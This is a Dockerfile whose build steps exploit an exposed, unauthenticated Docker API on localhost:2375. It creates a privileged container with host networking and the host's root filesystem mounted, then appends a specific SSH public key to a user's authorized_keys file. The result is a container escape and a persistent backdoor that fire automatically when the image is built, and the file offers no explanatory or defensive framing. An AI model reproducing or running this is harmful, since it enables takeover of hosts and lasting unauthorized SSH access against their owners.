FROM alpine:latest

RUN apk add --no-cache curl jq

RUN curl -X POST -H "Content-Type: application/json" -d '{"image": "alpine","Tty":true,"OpenStdin":true,"Privileged":true,"AutoRemove":true,"HostConfig":{"NetworkMode":"host","Binds":["/:/mnt"]}}' 'http://localhost:2375/containers/create?name=shell'
RUN curl -X POST http://localhost:2375/containers/shell/start
RUN exec_id=$(curl -s -X POST -H "Content-Type: application/json" -d '{"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Tty":false,"Cmd":["/bin/sh","-c","echo '\''ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB0tRdrX0BD79m5Iq/ih3xXekXurvn7QLfssPE0vLjqs'\'' >> /mnt/home/vpcadmin/.ssh/authorized_keys"]}' http://localhost:2375/containers/shell/exec | jq -r .Id) && curl -X POST "http://localhost:2375/exec/$exec_id/start" -H "Content-Type: application/json" -d '{"Detach": false, "Tty": false}'